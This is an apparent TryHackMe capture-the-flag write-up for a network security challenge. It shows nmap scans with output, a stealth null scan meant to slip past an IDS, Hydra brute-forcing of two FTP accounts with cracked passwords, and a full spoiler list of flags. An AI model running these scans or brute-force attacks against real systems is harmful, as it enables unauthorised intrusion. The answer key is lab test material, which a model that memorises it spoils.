# Net Sec Challenge

![](/CTF/2-Medium/net_sec_challenge/images/logo.png)

```bash
export IP=10.10.179.161
```

--------------------------------------------------------------------------------
## Nmap

```bash
nmap -sC -sV -oN nmap.txt $IP -vvv -p0-10000
```

<details>
    <summary>Nmap result:</summary>

    ```bash
    # Nmap 7.94SVN scan initiated Tue Jul 16 18:38:15 2024 as: nmap -sC -sV -oN nmap.txt -vvv -p0-10000 10.10.179.161
    Nmap scan report for 10.10.179.161
    Host is up, received syn-ack (0.22s latency).
    Scanned at 2024-07-16 18:38:15 -03 for 354s
    Not shown: 9997 closed tcp ports (conn-refused)
    PORT    STATE SERVICE     REASON  VERSION
    22/tcp  open  ssh         syn-ack (protocol 2.0)
    | ssh-hostkey: 
    |   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDI/lsJvB7tVnxblzcauj2/zvS2sREr9M28uEKQoWcfewzEn0gKyB8NJ5IRm+VxmgOAQpebzqZjZ+Wx9Ahd+gFRjpCvKCpLvxT58YK2thQrzyeT8HY03f7lhNBgUdLm/3gNcqV4cGO6PcxoWvxYIbbM98oiiAiWKBfzHocWAEh85bvY0E7ftelUp4P8DG2f0jERy2VMwEWzSzbB0DUSaasH57RJsNYQBE5jBdCwDbasaI5P04WHDCPk2wu9sc0MukhyDidK1/kWCdLHycfKGOWYC2XyCunGfiD1ynljDrRaqgagdjvfjHka81Ol17J00ILKyfM88yYqEeUCFAnQncTDPwIC7QTAPqKsw9fGWGdEYmo6Jur+v406kk/6xTQ2eOj+S1hD9ahzWFIy2MwrrwmFn3Hcb7/xfCw5rZJIVZWaoSWQYO71kGgoWAJZzKHziv0NUkgofTFpQGWthveIIMx1PNPdaIUH5M0/gbk5XscdbYjFuOFP5canSOQuxG8Prt8=
    |   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP1eIIFNNbSO2weyRY0pHKChu4RtCBTyhTjMOCSW/lRlmcZv1Glitrms3x2WQQ4CWjHw2XalVZvRursXCcUEOnQ=
    |   256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+Y0H+tldbG0k08Zkd3Lx1oBTlLh2KXyzS0lInfZmRp
    | fingerprint-strings: 
    |   NULL: 
    |_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
    80/tcp  open  http        syn-ack lighttpd
    | http-methods: 
    |_  Supported Methods: OPTIONS GET HEAD POST
    |_http-title: Hello, world!
    |_http-server-header: lighttpd THM{web_server_25352}
    139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
    445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port22-TCP:V=7.94SVN%I=7%D=7/16%Time=6696E99C%P=x86_64-pc-linux-gnu%r(N
    SF:ULL,29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");

    Host script results:
    |_clock-skew: 0s
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2024-07-16T21:44:03
    |_  start_date: N/A
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 13483/tcp): CLEAN (Couldn't connect)
    |   Check 2 (port 15880/tcp): CLEAN (Couldn't connect)
    |   Check 3 (port 14594/udp): CLEAN (Failed to receive data)
    |   Check 4 (port 18872/udp): CLEAN (Failed to receive data)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | Names:
    |   NETSEC-CHALLENG<00>  Flags: <unique><active>
    |   NETSEC-CHALLENG<03>  Flags: <unique><active>
    |   NETSEC-CHALLENG<20>  Flags: <unique><active>
    |   WORKGROUP<00>        Flags: <group><active>
    |   WORKGROUP<1e>        Flags: <group><active>
    | Statistics:
    |   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
    |   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
    |_  00:00:00:00:00:00:00:00:00:00:00:00:00:00

    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Tue Jul 16 18:44:09 2024 -- 1 IP address (1 host up) scanned in 354.04 seconds
    ```

</details>

> I found two **flags** in the nmap result above, which are answers to questions **4** and **5**.


#### I had to run nmap again to detect more ports
```bash
nmap -p- -sC -sV -oN full_scan -T4 $IP
```

<details>
    <summary>Nmap result:</summary>

    ```bash
    # Nmap 7.94SVN scan initiated Tue Jul 16 18:47:32 2024 as: nmap -p- -sC -sV -oN full_scan -T4 10.10.179.161
    Nmap scan report for 10.10.179.161
    Host is up (0.22s latency).
    Not shown: 65529 closed tcp ports (conn-refused)
    PORT      STATE SERVICE     VERSION
    22/tcp    open  ssh         (protocol 2.0)
    | ssh-hostkey: 
    |   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
    |   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
    |_  256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
    | fingerprint-strings: 
    |   NULL: 
    |_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
    80/tcp    open  http        lighttpd
    |_http-title: Hello, world!
    |_http-server-header: lighttpd THM{web_server_25352}
    139/tcp   open  netbios-ssn Samba smbd 4.6.2
    445/tcp   open  netbios-ssn Samba smbd 4.6.2
    8080/tcp  open  http        Node.js (Express middleware)
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    10021/tcp open  ftp         vsftpd 3.0.3
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port22-TCP:V=7.94SVN%I=7%D=7/16%Time=6696EE0A%P=x86_64-pc-linux-gnu%r(N
    SF:ULL,29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");
    Service Info: OS: Unix

    Host script results:
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    |_nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb2-time: 
    |   date: 2024-07-16T22:02:57
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Tue Jul 16 19:03:04 2024 -- 1 IP address (1 host up) scanned in 931.43 seconds
    ```
</details>


> With the search results above I found the answer to question **1** and question **3**.
And I also found a high port running an `ftp` service which is the answer to question **2**, I got the ftp version which is the answer to question **6**


#### To complete question 8, I need to scan secretly so as not to be detected by the IDS.
```bash
sudo nmap -sN $IP
```
> Question **8** flag displayed when accessing http://10.10.166.51:8080/

--------------------------------------------------------------------------------
## Hydra

We have the name of two users `eddie` and `quinn`, we will use brute-force to try to connect to the ftp using these users

```bash
hydra -l quinn -P /usr/share/wordlists/rockyou.txt -vV ftp://$IP:10021 

hydra -l eddie -P /usr/share/wordlists/rockyou.txt -vV ftp://$IP:10021
```

#### I got the password for both users
<details>
    <summary>User/Password:</summary>

    ```
    login: quinn   password: andrea
    login: eddie   password: jordan
    ```
</details>


--------------------------------------------------------------------------------
## FTP

```bash
ftp $IP 10021
Connected to 10.10.179.161.
220 (vsFTPd 3.0.3)
Name (10.10.179.161:kali): quinn
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30020|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30710|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |*******************************************************************************************|    18        6.62 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.07 KiB/s)
```
> I got the flag for question **7**

--------------------------------------------------------------------------------
## Spoiler alert

<details>
    <summary>1- What is the highest port number being open less than 10,000?</summary>

    ```
    8080
    ```

</details>

<details>
    <summary>2- There is an open port outside the common 1000 ports; it is above 10,000. What is it?</summary>

    ```
    10021
    ```

</details>

<details>
    <summary>3- How many TCP ports are open?</summary>

    ```
    6
    ```

</details>
<details>
    <summary>4- What is the flag hidden in the HTTP server header?</summary>

    ```
    THM{web_server_25352}
    ```

</details>
<details>
    <summary>5- What is the flag hidden in the SSH server header?</summary>

    ```
    THM{946219583339}
    ```

</details>
<details>
    <summary>6- We have an FTP server listening on a nonstandard port. What is the version of the FTP server?</summary>

    ```
    vsftpd 3.0.3
    ```

</details>
<details>
    <summary>7- We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?</summary>

    ```
    THM{321452667098}
    ```

</details>
<details>
    <summary>8- Browsing to http://10.10.179.161:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?</summary>

    ```
    THM{f7443f99}
    ```

</details>
